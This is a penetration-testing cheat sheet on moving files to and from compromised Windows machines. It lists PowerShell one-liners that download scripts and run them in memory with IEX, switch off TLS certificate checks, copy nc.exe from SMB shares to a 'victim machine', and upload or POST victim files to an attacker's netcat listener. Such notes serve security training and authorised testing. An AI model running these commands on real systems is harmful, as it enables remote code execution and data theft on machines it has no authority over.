---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Transferring files

## WINDOWS

### Powershell base64 download

```powershell
# Write base64 into file
[IO.File]::WriteAllBytes("C:\Users\Public\test.txt", [Convert]::FromBase64String("aGVsbG8sd29ybGQK"))
```

### Powershell download

```powershell
# Download into disk
(New-Object Net.WebClient).DownloadFile('http://example.com/test.txt','C:\Users\Public\test.txt')

# Download into disk (without blocking the calling thread)
(New-Object Net.WebClient).DownloadFileAsync('http://example.com/test.txt','test.txt')

# Download into disk (PowerShell 3.0+)
Invoke-WebRequest http://example.com/test.txt -OutFile test.txt

# Download into memory
IEX(New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')

# Download into memory
(New-Object Net.WebClient).DownloadString('http://example.com/test.ps1') | IEX

# Download into memory (PowerShell 3.0+)
IEX(iwr 'http://example.com/test.ps1')

# Download into memory (PowerShell 3.0+)
Invoke-WebRequest http://example.com/test.ps1 -UseBasicParsing | IEX

# Bypass SSL/TLS error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB download

```bash
# Create SMB share
sudo smbserver.py <share> -smb2support /tmp/share
# victim machine
copy \\$IP\<share>\nc.exe

# Create SMB share AUTHENTICATION
sudo smbserver.py <share> -smb2support /tmp/share -username admin -password password123
# victim machine AUTHENTICATION (need to mount first)
net use n: \\$IP\share /user:admin password123
copy n:\nc.exe 
```

### FTP download

```powershell
# Start the FTP server
python3 -m pyftpdlib --port 21

# Same as Powershell downloads (use ftp://)
# Download into disk
(New-Object Net.WebClient).DownloadFile('ftp://example.com/test.txt','C:\Users\Public\test.txt')

# Download into memory
IEX(New-Object Net.WebClient).DownloadString('ftp://example.com/test.ps1')
```

### Powershell base64 upload

```powershell
# Convert into base64
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### Powershell web upload

```powershell
# Start the UPLOAD server
python3 -m uploadserver

# Transfer/import module (PSUpload.ps1)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

# Upload the file
Invoke-FileUpload -Uri http://$IP:8000/upload -File C:\Users\Public\test.txt
```

### Powershell base64 web upload

```powershell
# Start the NC
nc -lnvp 8000

# Send base64 to NC
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Users\Public\test.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://$IP:8000/ -Method POST -Body $b64
```
